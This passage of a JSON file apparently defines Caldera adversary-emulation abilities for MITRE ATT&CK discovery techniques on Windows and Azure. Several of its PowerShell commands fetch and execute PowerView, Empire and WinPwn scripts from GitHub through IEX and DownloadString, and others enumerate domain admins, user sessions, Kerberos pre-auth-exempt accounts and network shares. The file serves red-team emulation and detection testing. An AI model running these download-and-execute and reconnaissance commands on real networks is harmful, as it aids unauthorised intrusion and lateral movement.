        "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1201",
            "name": "Password Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "214be4092770061080ef0781c26bab3e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "214be4092770061080ef0781c26bab3e"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__2594698a8e38a85b0d98468d87b49821": {
        "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2594698a8e38a85b0d98468d87b49821",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2594698a8e38a85b0d98468d87b49821"
    },
    "T1615__discovery__Group Policy Discovery__38714562d32f33dc32bd7aef553771d9": {
        "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "38714562d32f33dc32bd7aef553771d9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "38714562d32f33dc32bd7aef553771d9"
    },
    "T1526__discovery__Cloud Service Discovery__e78bde5dfb72eb88083c3717ce2fc8c7": {
        "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1526",
            "name": "Cloud Service Discovery"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1526Test1 -recurse -force -erroraction silentlycontinue",
                    "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential | out-null; Get-AzDomainInfo -folder $env:temp\\T1526Test1 -subscription \"None\" -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e78bde5dfb72eb88083c3717ce2fc8c7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e78bde5dfb72eb88083c3717ce2fc8c7"
    },
    "T1087.001__discovery__Account Discovery: Local Account__e528524d6a3cddaaddc89fcc719e2a3f": {
        "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.001",
            "name": "Account Discovery: Local Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e528524d6a3cddaaddc89fcc719e2a3f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e528524d6a3cddaaddc89fcc719e2a3f"
    },
    "T1033__discovery__System Owner/User Discovery__cfcf66cc85109ad2ebdb301d619fa41f": {
        "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cfcf66cc85109ad2ebdb301d619fa41f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "cfcf66cc85109ad2ebdb301d619fa41f"
    },
    "T1018__discovery__Remote System Discovery__681fd384d66be9e180a74e5fecdc4ab6": {
        "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\"); $Computers = $DirectorySearcher.findall(); foreach ($Computer in $Computers) {;   $Computer = $Computer.Properties.name;   if (!$Computer) { Continue };   Write-Host $Computer}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "681fd384d66be9e180a74e5fecdc4ab6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "681fd384d66be9e180a74e5fecdc4ab6"
    },
    "T1018__discovery__Remote System Discovery__13a0c78dbd8d3645db69540bfe7cd038": {
        "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "13a0c78dbd8d3645db69540bfe7cd038",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "13a0c78dbd8d3645db69540bfe7cd038"
    },
    "T1482__discovery__Domain Trust Discovery__53571e9988b92014f9d71888936d3878": {
        "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "53571e9988b92014f9d71888936d3878",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "53571e9988b92014f9d71888936d3878"
    },
    "T1518.001__discovery__Software Discovery: Security Software Discovery__36a790779a43eb407e4852726be0c66e": {
        "description": "Enumerates windows firewall to retrieves firewall rules from the target computer.\n\nwhen sucessfully executed, details of windows firewall is displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-NetFirewallProfile | Format-Table Name, Enabled; Get-NetFirewallSetting; Get-NetFirewallRule | select DisplayName, Enabled, Description",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "36a790779a43eb407e4852726be0c66e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "36a790779a43eb407e4852726be0c66e"
    },
    "T1518__discovery__Software Discovery__b5fe84fa9fb8216512867a039a61db20": {
        "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b5fe84fa9fb8216512867a039a61db20",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b5fe84fa9fb8216512867a039a61db20"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__9ccef9b46ce26850bb709a83d8e538ae": {
        "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse",
                    "command": "Invoke-Expression \"PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9ccef9b46ce26850bb709a83d8e538ae",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9ccef9b46ce26850bb709a83d8e538ae"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__613dc87cebac339d20973268e0bb1c0b": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "613dc87cebac339d20973268e0bb1c0b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "613dc87cebac339d20973268e0bb1c0b"
    },
    "T1082__discovery__System Information Discovery__a9faa0d792d6bc2660b05e7650d2736d": {
        "description": "Gathers local system information using the Morerecon function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a9faa0d792d6bc2660b05e7650d2736d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a9faa0d792d6bc2660b05e7650d2736d"
    },
    "T1135__discovery__Network Share Discovery__4b325a29e936cd1ccac2292bc92a31b5": {
        "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4b325a29e936cd1ccac2292bc92a31b5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "4b325a29e936cd1ccac2292bc92a31b5"
    },
    "T1217__discovery__Browser Bookmark Discovery__abc25aecd2ed0524af31e79add29cc43": {
        "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1217",
            "name": "Browser Bookmark Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "abc25aecd2ed0524af31e79add29cc43",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "abc25aecd2ed0524af31e79add29cc43"
    },
    "T1083__discovery__File and Directory Discovery__1033c974479429c54dff4470e614113d": {
        "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1083Test5.txt -ErrorAction SilentlyContinue",
                    "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\"); Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = \"$env:homedrive\\Users\\\"; foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach ($secondarydirectory in $folderarray);  {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; }; cat $env:temp\\T1083Test5.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1033c974479429c54dff4470e614113d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1033c974479429c54dff4470e614113d"
    },
    "T1018__discovery__Remote System Discovery__aaeee9107989a507f526b0cef1cb274f": {
        "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aaeee9107989a507f526b0cef1cb274f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "aaeee9107989a507f526b0cef1cb274f"
    },
    "T1046__discovery__Network Service Discovery__114ad8aad10ca59e6a10b655764d749a": {
        "description": "Scan ports to check for listening ports with python\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "python \"53b103_T1046.py\" -i 127.0.0.1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "53b103_T1046.py"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "114ad8aad10ca59e6a10b655764d749a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "114ad8aad10ca59e6a10b655764d749a"
    },
    "T1046__discovery__Network Service Discovery__01f95fd0213aeb1eb07fca8dc548f5ce": {
        "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "01f95fd0213aeb1eb07fca8dc548f5ce",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "01f95fd0213aeb1eb07fca8dc548f5ce"
    },
    "T1016__discovery__System Network Configuration Discovery__db1bb4f8462260edf0e7c4b892dd66ca": {
        "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -ErrorAction ignore \"$env:USERPROFILE\\Desktop\\open-ports.txt\"",
                    "command": "$ports = Get-content \"88a14d_top-128.txt\"; $file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"; $totalopen = 0; $totalports = 0; New-Item $file -Force; foreach ($port in $ports) {;     $test = new-object system.Net.Sockets.TcpClient;     $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null);     $wait.asyncwaithandle.waitone(250, $false) | Out-Null;     $totalports++ | Out-Null;     if ($test.Connected) {;         $result = \"$port open\" ;         Write-Host -ForegroundColor Green $result;         $result | Out-File -Encoding ASCII -append $file;         $totalopen++ | Out-Null;     };     else {;         $result = \"$port closed\" ;         Write-Host -ForegroundColor Red $result;         $totalclosed++ | Out-Null;         $result | Out-File -Encoding ASCII -append $file;     }; }; $results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"; $results | Out-File -Encoding ASCII -append $file; Write-Host $results",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "88a14d_top-128.txt"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "db1bb4f8462260edf0e7c4b892dd66ca",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "db1bb4f8462260edf0e7c4b892dd66ca"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__5a33c31395b6ef3ee38097b327c8b79d": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5a33c31395b6ef3ee38097b327c8b79d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5a33c31395b6ef3ee38097b327c8b79d"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__f5dd56d901db9f95668988426326bc3a": {
        "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5dd56d901db9f95668988426326bc3a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f5dd56d901db9f95668988426326bc3a"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__57781057e51ffecf21e38fd31c9d2f79": {
        "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "57781057e51ffecf21e38fd31c9d2f79",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "57781057e51ffecf21e38fd31c9d2f79"
    },
    "T1082__discovery__System Information Discovery__d91ba895a529dab873a22858cfdd3521": {
        "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "$resultstime = Get-Date -Format \"yyyyMMdd\"; $resultsfolder = (\"Results-\" + $resultstime); remove-item $env:temp\\$resultsfolder -recurse -force -erroraction silentlycontinue",
                    "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      ; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential; Connect-AzureAD -Credential $Credential; Scan-AzureAdmins -UseCurrentCred",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d91ba895a529dab873a22858cfdd3521",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d91ba895a529dab873a22858cfdd3521"
    },
    "T1057__discovery__Process Discovery__1d48fc4147a7bcd47bdf60db7dde9640": {
        "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-Process",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1d48fc4147a7bcd47bdf60db7dde9640",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1d48fc4147a7bcd47bdf60db7dde9640"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__42102f01777d40a7db982282c4c791e9": {
        "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
